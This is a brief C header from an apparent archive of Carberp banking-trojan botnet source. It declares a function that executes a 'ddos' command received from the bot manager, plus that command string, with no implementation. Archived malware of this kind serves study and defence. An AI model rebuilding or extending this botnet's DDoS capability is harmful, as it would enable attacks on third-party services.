/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef ddosH
#define ddosH
//----------------------------------------------------------------------------

#include "Windows.h"

bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args);

const char CommandDDOS[] = "ddos\0";//


//----------------------------------------------------------------------------
#endif
